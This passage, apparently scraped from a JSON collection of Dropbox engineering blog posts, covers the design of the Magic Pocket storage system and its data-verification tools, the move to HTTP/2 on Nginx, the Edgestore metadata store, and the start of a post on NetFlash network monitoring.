we’ve incremented the generation number we know that there’ll be no confusion about which OSDs hold the volume, even if the failed OSD comes back to life. This protocol ensures that any node can fail at any time without leaving the system in an inconsistent state. We’ve seen all sorts of crazy stuff in production. In one instance, a database frontend froze for a full hour before springing back to life and forwarding a request to the Replication Table, during which time the Master had also failed and restarted, issuing an entirely different set of repair operations. Our consistency protocols need to be completely solid in the face of arbitrary failures like these. The Master also runs a number of other background processes such as Reconcile, which validates OSD state and rolls back failed repairs or incomplete operations. The open/closed volume model is key for ensuring that live traffic doesn’t interfere with background operations, and allows us to use far simpler consistency protocols than if we didn’t enforce this dichotomy. Wrap-up Thanks for making it this far! Hopefully this post gives some context for how Magic Pocket works and for some of our motivations. The primary design principle here is keep it simple! Designing a distributed storage system is a big challenge, but it’s much harder to build one that operates reliably at scale, and supports all of the monitoring and verification systems and tooling that will ensure it’s running correctly. It’s also incredibly important to make technical decisions that are the right solution to the right problem, not just because they’re cool and novel. Most of MP was built by a team of less than half a dozen people, which required us to focus on the things that mattered, and played a big part in the success of the project. There are obviously a lot of details that we’ve left out. (Just in case you’re about to respond, “Wait! this doesn’t work when X, Y and Z happens!”— we’ve thought about that, I promise.) Stay tuned for future blog posts where we’ll go into more detail on specific aspects about building and operating a system at this scale. // Tags Infrastructure Magic Pocket // Copy link Link copied Link copied", "date": "2016-05-06"},
{"website": "Dropbox", "title": "Scaling to exabytes and beyond", "author": ["Akhil Gupta"], "link": "https://dropbox.tech/infrastructure/magic-pocket-infrastructure", "abstract": "How did we make this happen? Years ago, we called Dropbox a “Magic Pocket” because it was designed to keep all your files in one convenient place. Dropbox has evolved from that simple beginning to become one of the most powerful and ubiquitous collaboration platforms in the world. And when our scale required building our own dedicated storage infrastructure, we named the project “Magic Pocket.” Two and a half years later, we’re excited to announce that we’re now storing and serving over 90% of our users’ data on our custom-built infrastructure. Dropbox was founded by engineers, and the ethos of technical innovation is fundamental to our culture. For our users, this means that we’ve created a product that just works. But there’s a lot that happens behind the scenes to create that simple user experience. We’ve grown enormously since launching in 2008, surpassing 500 million signups and 500 petabytes (i.e., 5 followed by 17 zeroes!) of user data. That’s almost 14,000 times the text of all the books in the Library of Congress. To give you a sense of the incredible growth we’ve experienced, we had only about 40 petabytes of user data when I joined in 2012. In the 4 years since, we’ve seen over 12x growth. Dropbox stores two kinds of data: file content and metadata about files and users. We’ve always had a hybrid cloud architecture, hosting metadata and our web servers in data centers we manage, and storing file content on Amazon. We were an early adopter of Amazon S3, which provided us with the ability to scale our operations rapidly and reliably. Amazon Web Services has, and continues to be, an invaluable partner—we couldn’t have grown as fast as we did without a service like AWS. As the needs of our users and customers kept growing, we decided to invest seriously in building our own in-house storage system. There were a couple reasons behind this decision. First, one of our key product differentiators is performance. Bringing storage in-house allows us to customize the entire stack end-to-end and improve performance for our particular use case. Second, as one of the world’s leading providers of cloud services, our use case for block storage is unique. We can leverage our scale and particular use case to customize both the hardware and software, resulting in better unit economics. We knew we’d be building one of only a handful of exabyte-scale storage systems in the world. It was clear to us from the beginning that we’d have to build everything from scratch, since there’s nothing in the open source community that’s proven to work reliably at our scale. Few companies in the world have the same requirements for scale of storage as we do. And even fewer have higher standards for safety and security. We built reliability and security into our design from the start, ensuring that the system stores the data in a safe and secure manner, and is highly available. The data is encrypted at rest, and the system is designed to provide annual data durability of over 99.9999999999%, and availability of over 99.99%. How did we make this happen? Code development: Magic Pocket became a major initiative in the summer of 2013. We’d built a small prototype as a proof of concept prior to this to get a sense of our workloads and file distributions. Software was a big part of the project, and we iterated on how to build this in production while validating rigorously at every stage. The innovation focused on creating a clean design that would scale from zero to one of the largest storage systems in the world, and automation that would allow our small team to maintain an enormous amount of hardware. We needed to test and audit the reliability of the system for the highest levels of data durability and availability. Dark launch: In August 2014, we embarked on our \"dark launch,\" at which point we were mirroring data between two regional locations and considered the system ready to store user data. Of course, being Dropbox, we kept extra backups for another 6 months after this date just in case. Launch day: February 27, 2015 was D-day. For the first time in the history of Dropbox, we began storing and serving user files exclusively in-house. Once we validated our new infrastructure, we set an aggressive goal of scaling the system to more than 500PB in six months. BASE Jump: On April 30, 2015, we began the race to install additional servers in three regional locations fast enough to keep up with the flow of data. To make this all work, we built a high-performance network from our servers which allowed us to transfer data at a peak rate of over half a terabit per second. Because our schedule left so little time to “open the parachute,” we called this part of the project BASE Jump. On the hardware side, we were pushing up against the limitations of how many racks of hardware could fit in the loading dock at one time. Successful landing: Our goal was to serve 90% of our data from in-house infrastructure by October 30, 2015. We actually hit the mark almost a month early, on October 7, 2015. The team not only delivered on time, but also achieved this significant technical undertaking without any major service disruptions or any loss of data. This is an exciting milestone and the start of more innovation to come. We’ll continue to invest in our own infrastructure as well as partner with Amazon where it makes sense for our users, particularly globally. Later this year, we’ll expand our relationship with AWS to store data in Germany for European business customers that request it. Protecting and preserving the data our users entrust us with is our top priority at all times. This is Dropbox engineering—always aiming higher! This is the first of a series of blog posts about the Magic Pocket. Over the next month we’ll share a lot of the technical details around what we learned from building our own high-performance cloud infrastructure. Stay tuned. // Tags Infrastructure Magic Pocket // Copy link Link copied Link copied", "date": "2016-03-14"},
{"website": "Dropbox", "title": "Pocket watch: Verifying exabytes of data", "author": ["Jamesacowling"], "link": "https://dropbox.tech/infrastructure/pocket-watch", "abstract": "Table-stakes: Replication How correct is correct? Verification Systems Disk Scrubber Trash Inspector Extent Referee Metadata Scanner Storage Watcher Cross-zone Verifier Verification as testing Watching the watchers Wrap-up There is nothing more important to Dropbox than the safety of our user data. When we set out to build Magic Pocket, our in-house multi-exabyte storage system , durability was the requirement that underscored all aspects of the design and implementation. In this post we’ll discuss the mechanisms we use to ensure that Magic Pocket constantly maintains its extremely high level of durability. This post is the second in a multi-part series on the design and implementation of Magic Pocket . If you haven’t already read the Magic Pocket design overview go do so now; it’s a little long but provides an overview of the architectural features we’ll reference within this post. If you don’t have time for that then keep on reading, we’ll make this post as accessible as possible to those who are new to the system. Table-stakes: Replication When most good engineers hear “durability” they think “replication”. Hardware can fail, so you need to store multiple copies of your data on physically isolated hardware. Replication can be tricky from a mathematical or distributed-systems perspective, but from an operational perspective is the easiest to get right. In the case of Magic Pocket (MP) we use a variant on Reed-Solomon erasure coding that is similar to Local Reconstruction Codes , which allows us to encode and replicate our data for high durability with low storage overhead and network demands. If we use a Markov model to compute our durability given the expected worst-case disk failure rates and repair times, we end up with an astonishingly-high 27 nines of durability . That means that according to this model, a given block in Magic Pocket is safe with 99.9999999999999999999999999% probability! Does that mean we should trust this model and call it a day? Of course not. Replication is a necessary ingredient for durability, but by no means is it sufficient. There are a lot more challenging failure modes to contend with than just random disk failures: stuff like natural disasters, software bugs, operator error, or bad configuration changes. True real-world durability requires investing heavily in preventing these less-frequent but wider-reaching events from impacting data safety. We recently presented a talk on Durability Theater , highlighting the challenges in building a system for real-world durability . Take a look at the video to find out more about about the breadth of defenses we employ against data loss, which we categorize across four dimensions: Isolation, Protection, Verification and Automation. Each of these would be a great topic for future blog posts but today we want to focus on one of our favorite areas of investment: Verification . How correct is correct? The most important question we ask ourselves every day is “is this system correct?” This is an easy question to ask, but a surprisingly difficult question to answer authoritatively. Many systems are “basically correct”, but the word “basically” can contain a lot of assumptions. Is there a hidden bug that hasn’t been detected yet? Is there a disk corruption that the system hasn’t stumbled across? Is there bad data in there from years and years ago that is used as a scapegoat whenever the system exhibits unexpected behavior? A durability-centric engineering culture requires rooting out any potential issues like this and establishing an obsessive focus on correctness. A large fraction of the Magic Pocket codebase is devoted purely to verification mechanisms that confirm that the system continually maintains our high level of correctness and durability. This is a significant investment from the perspective of engineering time, but it’s also a huge hardware and resource-utilization investment: more than 50% of the workload on our disks and databases is actually our own internal verification traffic. Let’s take a look at the stack of verifiers that we run continually in production… One quick definition before we get started: an extent is the physical manifestation of a data volume on a given storage node. Each storage node stores thousands of 1GB extents which are full of blocks of user data. Verification Systems Cross-zone Verifier Application-level walker that verifies all data is in the storage system and in the appropriate storage regions. Storage Watcher Sampled black-box check that retrieves blocks after a minute, hour, day, week, etc. Metadata Scanner Verifies all data in the Block Index is on the correct storage nodes. Extent Referee Verifies that all deleted extents were justified according to system logs. Trash Inspector Verifies all deleted extents contain only blocks that are deleted or have been moved to other storage nodes. Disk Scrubber Verifies data on disk is readable and conforms to checksums. There are a lot of scanners in here so we’ll go through them one-by-one. Let’s start with the lowest level of the storage stack: the Disk Scrubber. Disk Scrubber This will be no surprise to those working in large-scale storage: your disks are lying to you . Hard drives are an amazing and reliable technology, but when you have over half a million disks in production they’re going to fail in all manner of weird and wonderful ways: bad sectors, silent disk corruption and bit-flips, fsyncs that don’t fsync . Many of these errors also slip through S.M.A.R.T. monitoring on the disks and lie there dormant, waiting to be discovered… or worse, not discovered at all. When we talked about our durability model we mentioned how it depends on the time taken to repair a disk failure. When we detect a bad disk in MP we quickly re-replicate the data to ensure the volumes aren’t vulnerable to a subsequent disk failures, usually in less than an hour. If a failure were to go undetected however, the window of vulnerability would expand from hours to potentially months, exposing the system to data loss. The disk scrubber runs continually on our storage nodes, reading back every bit on disk and validating it against checksums. If the scrubber detects bad data on disk then it automatically schedules that data to be re-replicated and for the disk to enter our disk remediation workflow , which we’ll discuss in a future post. We perform a full sweep of each disk approximately every 1–2 weeks. This requires reading terabytes of data off the disk, but these are sequential scans which minimizes disk seeks. We also scan the recently-modified areas of the disk more frequently to catch any fresh issues. Trash Inspector If Magic Pocket needs to move a volume between storage nodes, or rewrite a volume after garbage collecting it, then it writes the volume to a new set of storage nodes before deleting it from the old nodes. This is an obviously-dangerous transition: what if a software bug caused us to erroneously delete an extent that hadn’t yet been written stably to a new location? We adopt a protection in MP called trash . When the Master in a cell instructs a storage node to delete an extent the node actually just moves the extent to a temporary storage location on the disk. This “trash” data sits there until we can be sure this data was deleted correctly. The Trash Inspector iterates over all the blocks in trash extents and checks the Block Index to determine that either: the block has been safely moved to a new set of storage nodes, or the block itself was also marked to be deleted. Once a trash extent passes inspection it is kept on-disk for an additional day (to protect against potential bugs in the trash inspector) before being unlinked from the filesystem. Extent Referee The Trash Inspector does a good job of ensuring that we only delete data as intended, but what if a bad script or rogue process attempts to delete an extent before it has passed inspection? This is where the Extent Referee comes in. This process watches each filesystem transition and ensures that any move or unlink event corresponds to a successful trash inspection pass and corresponding instruction from the Master to remove the extent. The Extent Referee will alert on any transition that doesn’t conform to these requirements. We also employ extensive unix access controls along with TOMOYO mandatory access control to guard against operators or unintended processes interacting with data on storage nodes. More on these in future posts. Metadata Scanner One advantage of storing our Block Index in a database like MySQL is that it’s really easy to run a table scan to validate that this data is correct. The Metadata Scanner does exactly this, iterating over the Magic Pocket Block Index at around a million blocks per second (seriously!), determining which storage nodes should hold each block, and then querying these storage nodes to make sure the blocks are actually there. A million checks per second sounds like a lot of activity, and it is, but we have many hundreds of billions of blocks to check. Our goal is to perform a full scan over our metadata approximately once per week to give us confidence that data is entirely correct in one storage zone before we advance our code release process and deploy new code in the next zone. The storage nodes keep enough metadata in-memory to be able to answer queries from the Metadata Scanner without performing a disk seek. The Metadata Scanner and Disk Scrubber thus work together to ensure both that the data on the storage nodes matches the data in the Block Index, and also that the data on the disks themselves is actually correct. Storage Watcher The most insidious bugs in a large distributed system are logic errors on the boundaries between modules: an engineer misunderstanding an API, or the semantics of an RPC call, or the meaning of a field in a database. These are hard to catch in unit testing, and typically require comprehensive integration testing or verification mechanisms to detect. But what if the engineer writing the code is the same person writing the tests or the verifier? It’s very likely that the same broken assumptions will make their way into the verification mechanism itself. The Watcher was designed to avoid any such “broken verifiers” and was written as an end-to-end black box checker, implemented by someone who wasn’t involved in building the storage system. We sample 1% of all blocks written to Magic Pocket and record their corresponding storage keys (hashes) in queues in Kafka . The Watcher then iterates over these queues and makes sure it can correctly fetch these blocks from Magic Pocket after one minute, one hour, one day, one week and one month. This allows us to verify that MP is indeed still serving blocks correctly from an end-to-end perspective, and that there are no errors introduced over time that may prevent a block from being accessed. Cross-zone Verifier This is the last one so we’ll make it quick. MP contains multiple storage zones that store data for different users and we need to maintain some careful invariants when moving users between these zones. We also need to make sure that if a zone goes down for maintenance or because of an outage that we recover quickly and transfer all data that may have been missed during this downtime. The Cross-zone Verifier lives outside of MP and scans through the Dropbox filesystem maintained in a separate system called File Journal . This verifier walks this filesystem and checks that all files in Dropbox are correctly stored in all zones corresponding to the given user. While the other verifiers confirm that MP is correctly storing the blocks that we know we should have, the Cross-zone Verifier ensures that there’s agreement between what MP is storing and what our clients (the rest of Dropbox) think we should be storing. Verification as testing If it felt like a lot of work reading that long list of verifiers, rest assured that it was a lot more work to actually build them. Building these verifiers was a really valuable investment for us however, and greatly improved our execution speed. This is because a comprehensive verification stack doesn’t just ensure that the system is correct in production, it also provides a highly-valuable testing mechanism for new code. Unit tests are great but there’s no substitute for comprehensive integration testing. We run a broad suite of integration tests on simulated workloads, including failure injection and multiple simultaneous code versions, but the final gateway to production is always our Staging cluster. This cluster is tens of petabytes in size and stores a geographically-distributed mirror of a subset of production data. We actually serve live traffic out of Staging and fall back to production MP if there’s a problem. We run these verifiers for at least a week on Staging before team members can sign off to release a code version from stage into production. The verification mechanisms provide us a very comprehensive view into the correctness of the system and ensure that any bugs are caught before they make it to an actual production cluster. Watching the watchers One last remark before we go: how do we verify the verifiers themselves? Here’s a screenshot of the primary metric generated by the Metadata Scanner. Take a look and see if you notice anything interesting: That’s right, it’s the most boring graph in the world! MP is designed for extremely high levels of durability so the graph of missing hashes is just a zero line. Apart from the Disk Scrubber which finds regular disk errors, and occasional timeouts from our other verifiers, all our verification graphs look like this. How do we know that the scanners are actually doing something useful rather than just spitting out zeros all day? What we really need to do is create some problems and make sure they get detected. This dovetails into a larger discussion about DRTs ( Disaster Recovery Training events) that we’ll cover another time. These are induced failures to test that a system is able to recover from disaster, and that the team is trained to respond to an incident. The other important and sometimes-overlooked aspect to a DRT however is ensuring that all the verification systems are actually doing their job. For us this means constructing failure tests that trigger our verification mechanisms without potential for actually impacting user data. Typically this means running tests in our staging cluster, which is safely backed up in our production clusters. The details of one interesting test are as follows: In this test one of our engineers got permission to secretly corrupt data in our staging cluster, flipping bits, truncating extents, and inserting random data. We then waited for the rest of the team to detect the full set of errors. In this particular test all errors were quickly detected, except for two which were automatically repaired by MP before the verifiers got to them. Importantly however, there was no data loss in our staging cluster because of this test; MP contains enough redundancy to automatically detect and recover from all these failures without any operator intervention. Wrap-up It was certainly a lot of work to build all the verification systems in MP; there probably aren’t too many large-scale systems in the world subject to more scrutiny. Every project will involve a tradeoff on the spectrum of effort vs correctness, and for Dropbox data-safety is of paramount importance. Regardless of where you land on this spectrum, the main lesson from this post is that confidence in correctness is a very empowering concept. Being able to reason about the current state of a storage system means that you’re able to move fast on future development, respond to operational issues with confidence, and to build reliable client applications without confusion about the source of errors or inconsistencies. It also lets us sleep a little better every night, which is always a valuable investment. Stay tuned for more posts about Magic Pocket. Next post will likely cover some of the operational issues involved in running a system at this scale, followed by a post discussing our Diskotech architecture to support append-only SMR storage . We’ll catch you then! // Tags Infrastructure Magic Pocket // Copy link Link copied Link copied", "date": "2016-07-06"},
{"website": "Dropbox", "title": "Enabling HTTP/2 for Dropbox web services: experiences and observations", "author": ["Hwyuan"], "link": "https://dropbox.tech/infrastructure/enabling-http2-for-dropbox-web-services-experiences-and-observations", "abstract": "Background: HTTP/2 and Dropbox web service infrastructure The HTTP/2 upgrade process Observations Performance improvement A couple of caveats Debugging tools We're hiring! At Dropbox, our traffic team recently upgraded the front-end Nginx servers to enable HTTP/2 for our web services. In this article, we would like to share our experiences and findings during the HTTP/2 transition. The overall upgrade was smooth for us, although there are also a couple of caveats that might be helpful to others. Background: HTTP/2 and Dropbox web service infrastructure HTTP/2 ( RFC 7540 ) is the new major version of the HTTP protocol. It is based on SPDY and provides several performance optimizations compared to HTTP/1.1. These optimizations include more efficient header compression, server push, stream multiplexing over the same connection, etc. As of today, HTTP/2 is supported by major browsers . Dropbox uses the open-source Nginx to terminate SSL connections and perform layer-7 load balancing for web traffic. Before the upgrade, our front-end servers ran Nginx 1.7-based software and supported SPDY. Another motivation for the upgrade is that Chrome currently supports SPDY and HTTP/2 but they will be dropping SPDY support on May 15th. If we don’t support HTTP/2 at that time, our Chrome clients would go from using SPDY back to HTTP/1.1. The HTTP/2 upgrade process The HTTP/2 upgrade was a straightforward and smooth transition for us. Nginx 1.9.5 added the HTTP/2 module (co-sponsored by Dropbox) and dropped SPDY support by default. In our case, we decided to upgrade to Nginx 1.9.15, which was then the latest stable version. The Nginx upgrade involves making simple changes in configuration files. To enable HTTP/2, the http2 modifier needs to be added to the listen directive. In our case, because SPDY was previously enabled, we simply replaced spdy with http2 . Before  (SPDY): listen A.B.C.D:443 ssl spdy ; After (HTTP/2): listen A.B.C.D:443 ssl http2 ; Of course, you probably want to go through the complete Nginx HTTP/2 configuration options to optimize for the specific use cases. As for deployments, we first enabled HTTP/2 on canary machines for about a week while we were still using SPDY in production. After verifying the correctness and evaluating the performance, HTTP/2 was enabled across the fleet for our web services. Smooth transition from SPDY to HTTP/2 (60 minutes of traffic) The figure above shows the smooth transition from SPDY to HTTP/2. The remaining HTTP/1.1 connections are not shown in this figure. We gradually enabled HTTP/2 across all front-end web servers around minute 23, 36, and 50. Before that, the connections include both HTTP/2 traffic in the canary machines and SPDY traffic in production machines. As you can see, roughly all the SPDY clients eventually migrated to HTTP/2. Observations We have closely monitored the performance after we enabled HTTP/2 on canary machines. Our observations include performance data that demonstrates the effectiveness of HTTP/2 as well as a couple of caveats as most HTTP/2 implementations are still relatively new. Performance improvement We have seen a significant reduction in the ingress traffic bandwidth, which is due to more efficient header compression ( HPACK ). Reduced ingress traffic bandwidth (24 hours of traffic) The figure above shows the ratio of average (per machine) traffic bandwidth between the canary and production machines, where HTTP/2 was enabled only on canary machines. Every canary or production machine received approximately the same amount of traffic from load balancers. As can be seen, the ingress traffic bandwidth was reduced significantly (close to 50%) after we enabled HTTP/2. It is worth noting that although we enabled SPDY previously in all canary and production machines, we did not turn on SPDY header compression due to the related security issues ( CVE-2012-4929 aka CRIME). As for egress traffic, there was no significant change because headers typically contributed to a small fraction of the response traffic. A couple of caveats Update: the issues with the increased POST request latency and refused stream errors were resolved in the recent Nginx 1.11.0 release . The figure of the updated P50 request latency after applying this change is at the end of this post. Increased latency for POST requests. When we enabled HTTP/2 on the canary machines, we noticed an increase in median latency. The figure below shows the ratio of P50 request latencies between canary and production machines. We investigated this issue and found that the increased latency was introduced by POST requests. After further study, this behavior appeared to be due to the specific implementation in Nginx 1.9.15. Related discussions can be found in the Nginx mailing list thread . Increased P50 request latency (24 hours of traffic) Note that the increased P50 request latency ratio we see here (approximately 1.5x) depends on the specific traffic workload. In most cases, the overhead was about one additional round trip time for us, and it did not impact our key performance much. However, if your workload consists of many small and latency-sensitive POST requests, then the increased latency is an important factor to consider when upgrading to Nginx 1.9.15. Be careful with enabling HTTP/2 for everything, especially when you do not control the clients. As HTTP/2 is still relatively new, from our experience, some clients/libraries and server implementations are not fully compatible yet. For example: With Nginx 1.9.15, clients could get refused stream errors for POST requests if they attempt to send DATA frames before acknowledging the connection SETTING frame. We have seen this issue with the Swift SDK. It is worth noting that monitoring Nginx error logs is crucial during deployments, and this specific error message requires increasing the error log severity to INFO. Chrome did not handle RST_STREAM with NO_ERROR properly and caused issues ( Chromium Issue #603182 ) with Nginx 1.9.14. A workaround has been included in Nginx 1.9.15. Nghttp2 did not send END_STREAM when there was no window space, and it was also discussed in the aforementioned Nginx mailing list thread . Because our API users may employ various of third-party HTTP libraries, we need to perform more extensive testing before enabling HTTP/2 support for our APIs. Debugging tools CloudFlare has presented a nice summary of HTTP/2 debugging tools . In addition, we found the Chrome net-internals tool (available at chrome://net-internals/#http2 in Chrome) to be helpful. The figure below is a screenshot of frame exchanges reported by net-internals when opening a new HTTP/2 session to www.dropbox.com . Screenshot of net-internals when opening a new HTTP/2 session Overall, we made a smooth transition to HTTP/2. The following are a few takeaways from this post. It was simple to enable HTTP/2 in Nginx. Significant ingress traffic bandwidth reduction because of header compression. Increased POST request latency due to the specific HTTP/2 implementation in Nginx 1.9.15. Be careful with enabling HTTP/2 for everything as implementations are not fully compatible yet. Canary verification and Nginx error log examination could help catch potential issues early on. We hope this post is helpful for those who are interested in enabling HTTP/2 for their services or those interested in networking in general. We would also like to hear your feedback in the comments below. Update: the issues with the increased POST request latency and refused stream errors were resolved in the recent Nginx 1.11.0 release . The figure below shows that the P50 request latency ratio (canary vs. production) decreased after applying the change in canary machines. Note that in this figure, the P50 request latency in production was increased previously when we upgraded to nginx 1.9.15 to support HTTP/2. Reduced P50 request latency ratio after applying the change (4 hours of traffic) Contributors: Alexey Ivanov, Dmitry Kopytkov, Dzmitry Markovich, Eduard Snesarev, Haowei Yuan, and Kannan Goundan We're hiring! Do you like traffic–related stuff? Dropbox has a globally distributed edge network, terabits of traffic, millions of requests per second, and a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and load balancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? We’re also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . // Tags Infrastructure Traffic // Copy link Link copied Link copied", "date": "2016-05-11"},
{"website": "Dropbox", "title": "(Re)Introducing Edgestore", "author": ["Diwaker"], "link": "https://dropbox.tech/infrastructure/reintroducing-edgestore", "abstract": "A Brief History Architecture Overview Use Cases Shared Folders Email Campaigns Trust and Security Coming Up Edgestore is the metadata store that powers many internal and external Dropbox services and products. We first talked about Edgestore in late 2013 and needless to say, much has happened since. In this post, we give a high-level overview of the motivation behind Edgestore, its architecture, salient features and how it’s being used at Dropbox. We’ll be doing a deep-dive on various aspects of Edgestore in subsequent posts. A Brief History Like so many startups, Dropbox started with vanilla MySQL databases for our metadata needs. As we rapidly added both users and features, we soon ended up with multiple, independent databases; some databases grew so large that we had to split them into multiple shards. And before long, unsurprisingly, we started hitting challenges of such an architecture, such as: Having to write SQL and interact with MySQL directly impacted developer productivity. In the same vein, schema evolution was brittle and error-prone. Managing so many independent MySQL hosts imposed a significant operational burden. Reactively (re)sharding individual databases as they hit capacity limits was cumbersome; conversely, setting up new database clusters for every use case added a lot of overhead. Lack of isolation meant bugs or slow queries would adversely impact performance across the board In late 2012, we began building a system that would address these challenges. In addition, we wanted the following characteristics to meet future needs: Flexible enough to support a broad class of existing and future use cases Developer friendly APIs and easy schema evolution to accelerate product teams Table-stakes for critical infrastructure services: durability, high-availability and excellent performance. At the time, no off-the-shelf solution met all our requirements. Given our in-house MySQL expertise and similar systems at other companies (notably, Facebook’s TAO ), we decided to build our own system that would abstract away the database by providing higher-level abstractions and use MySQL (InnoDB) as the storage engine. Edgestore started out as a simple client-side ORM wrapper, but has over time evolved into a sophisticated service with features like caching, geo-replication and multi-tenancy. Edgestore has been running in production at Dropbox for almost four years, on thousands of machines across multiple data centers, storing several trillion entries and servicing millions of queries per second with 5–9s of availability! Architecture Overview Users interact with Edgestore via language-specific SDKs that implement the Edgestore API. The API allows developers to easily describe (and evolve) their data model without worrying about how or where data gets stored. We currently provide SDKs for Go and Python. Objects in Edgestore can be Entities or Associations , each of which can have user-defined attributes (roughly analogous to columns in a traditional database table). Associations describe how different Entities relate to each other: for instance, users/group membership might be described using a UserEntity , TeamEntity and a UserTeamAssoc . The SDK provides Edgestore Clients that connect to any one of Edgestore Cores . Cores comprise a stateless layer responsible for routing (or forwarding) the request to the correct “shard” (or region). Since our workload is read-heavy, Cores use a Caching Layer to speed lookups. The caches are also partitioned and replicated for high-availability. Edgestore provides strong-consistency by default, which requires invalidating caches on writes. If the workload can tolerate stale reads, clients can request eventual consistency. For writes (or on a cache-miss), Cores send the request to the Engine where data is “mastered”, as determined by our partitioning scheme. Engines abstract away the Storage layer from Cores, so our design is not MySQL specific. Engines translate Edgestore APIs to MySQL commands and track resource consumption by traffic-source. This forms the foundation of isolation and multi-tenancy in Edgestore. For brevity, we’re glossing over many technical details here. Please check back for our follow-up posts where we’ll deep-dive into the special topics listed under “Coming Up” below! Use Cases Edgestore’s flexible data model enables some of the most critical and well-known use cases in our product, demonstrating the diversity of workloads it’s capable of supporting.  From graph-like representations, key-value stores and queues, Edgestore is a veritable swiss army knife of data models for our product engineers to leverage. Here are a few examples. Shared Folders The core aspects of sharing and collaboration are all modeled using Edgestore’s graph-like data model. Users and Folders are represented as Edgestore entities. Bi-directional associations make it easy to query all folders a given user has access to, as well as all users that have access to a given shared folder. Removing a user from a shared folder requires removing just a single association. Email Campaigns Given its continued dominance, it should be no surprise that email remains one of the most powerful ways for Dropbox to connect with our user base. To make it easy for any team in Dropbox to set up an email campaign, we have built an internal email management system that leverages Edgestore’s ability to function as a queue. Every email message that is stored and sent through our email service maintains an Assoc with the current status of the message (is the message pending, is it scheduled to go out, was it sent and returned with an error) and a timestamp that is used to order the messages. A periodic job is used to scan the timestamps and status to see which messages require sending; they are sent and removed from the queue (or re-enqueued, as needed). This system stores all of its metadata in Edgestore and relies on Edgestore’s strong consistency guarantees to provide exactly–once delivery semantics. Trust and Security At Dropbox, being worthy of our users’ trust is a core company value . In a previous blog post , we covered our support for Universal 2nd Factor (U2F) security keys as an additional method for two-step verification to provide stronger authentication protection to our users. Our implementation of U2F leverages Edgestore to store critical metadata like the hardware token and the public key associated with each token, as well as other relevant information in the association between a User entity and a Host entity. Coming Up To recap, Edgestore is a strongly consistent, read-optimized, horizontally scalable, geo-distributed metadata store that powers many internal and external Dropbox services and products. At some point as a company evolves, the need arises for a flexible, generic metadata store. Rather than continue bolting more features and tooling to our MySQL infrastructure, we built Edgestore to abstract away the database altogether. We are excited to share our learnings with the community! This is the first of a series of blog posts about Edgestore. Over the next few months, we plan to cover more technical details on some of the more interesting aspects of Edgestore. Some examples: Data Model and Schema Evolution: We’ll describe how Edgestore users express their data model and how Edgestore represents that on-disk, as well as how users evolve the data model over time. Consistent Caches: Many Edgestore workloads require strong consistency, which in turn requires that in-memory caches are always consistent with on-disk state. Doing this in a performant way without sacrificing availability posed some interesting challenges for us. Event Stream: We found many applications interested in acting upon metadata in Edgestore as it gets written/updated. To enable this, we’ve built an event stream abstraction. Cross Data-Center Routing and Replication: To support geo-replication in Edgestore, we had to build a custom replication pipeline (one of the consumers of the aforementioned event stream) as well as a request routing and forwarding layer. Multi-Tenancy: Edgestore is used by dozens of products and services, both internal and external. We share a single Edgestore deployment for all workloads, necessitating good attribution and isolation across workloads. Operations and Tooling: Edgestore is mission-critical, complex service with high availability requirements. We hope to share more about how we manage different parts of our infrastructure. This is a tentative list — if there are specific areas you’d like to see covered, please leave a comment! Thanks to: Alex Degtiar, Adil Hafeez, Bogdan Munteanu, Chris Roberson, Daniel Tahara, Kerry Xing, Maxim Bublis, Mehant Baid, Michelle Chesley, Mihnea Giurgea, Rajat Goel, Renjish Abraham, Samir Goel, Tom Manville and Zviad Metreveli // Tags Infrastructure Metadata Mysql Edgestore // Copy link Link copied Link copied", "date": "2016-08-30"},
{"website": "Dropbox", "title": "NetFlash: Tracking Dropbox network traffic in real-time with Elasticsearch", "author": ["Leoatdbx"], "link": "https://dropbox.tech/infrastructure/netflash-tracking-dropbox-network-traffic-in-real-time-with-elasticsearch", "abstract": "The collector Kafka cluster LogHub Elasticsearch cluster What we learned Results Large-scale networks are complex, dynamic systems with many parts, managed by many different teams. Each team has tools they use to monitor their part of the system, but they measure very different things. Before we built our own infrastructure, Magic Pocket , we didn’t have a global view of our production network, and we didn’t have a way to look at the interactions between different parts in real time. Most of the logs from our production network have semi-structured or unstructured data formats, which makes it very difficult to track a large amount of log data in real-time. Relational database models do not support these logs very well, and while NoSQL solutions such as HBase or Hive can store large amounts of logs easily, they aren’t readily stored in a form that can be indexed in real-time. The real-time view was particularly critical when we moved 500 petabytes of data—in network terms more than 4 exabits of traffic—into our exabyte-scale Magic Pocket infrastructure in less than six months. This aggressive goal required our network infrastructure to support high traffic volume over a long period of time without failure. Knowing the traffic profile on the production backbone between AWS and our datacenter helped us detect anomalies. Mapping NetFlow data to our production infrastructure made it much faster to recognize the root source of problems. We developed the NetFlash system to answer the scale and real-time challenges. NetFlash collects large volumes of NetFlow data from our network that we enhance with information specific to our infrastructure. We then use Elasticsearch (ES) to query these enhanced logs, and Kibana as a web UI for creating dashboards to monitor the queries in real-time. Here’s an example so you can see the insights we are able to surface with this system. In the image below, you can see that the network traffic in several clusters momentarily drops without warning at nine in the morning: In the next image, we see that outbound traffic to AWS also took a dive: Finally, in the third image, we’ve drilled down to the individual team that made the change that affected network performance: Before NetFlash, on-call engineers would have a much harder time diagnosing issues as they were happening. In our previous system, it could take many hours to query the network data from an event like the one we’ve just seen. Now, thanks to this chart, it’s just a matter of sending a quick message directly to the right team, and getting things back on track. Simple, right? Actually there was quite a bit we had to do to make this all work in production. First, a few definitions so you understand the different pieces of the system and how they are affected by the massive scale of our infrastructure. NetFlow is an industry-standard datagram format proposed by Cisco. A NetFlow datagram contains information like source IP addresses, destination IP addresses, the source and destination ports, IP protocol, and the next hop IP address. In principle, if we gather NetFlow logs from all of our routers, we have a concise view of where our network traffic data is coming from, where it’s going, and any hurdles it encounters along the way. Elasticsearch is an open source distributed search service. It is the most popular enterprise search engine that powers well-known services from Microsoft Azure Search to the full archive of The New York Times . In large deployments like ours, ES is running on multiple clusters to enable real-time querying of large amounts of data. Kibana is an open source project that enables data visualizations (like the samples above) from the content indexed by an Elasticsearch cluster. We found this combination would allow us to monitor our network data in real-time at scale. Dropbox generates roughly 260 Billion NetFlow datagram records every day. That’s terabytes of aggregated data about our data flows. In our first implementation of NetFlow collection, we stored the logs to our data infrastructure in Hive/Hadoop clusters, and analyzed them with HiveSQL queries. We still use this data pipeline for permanent storage, but it’s slow. New data isn’t available to query for somewhere between two and twelve hours after 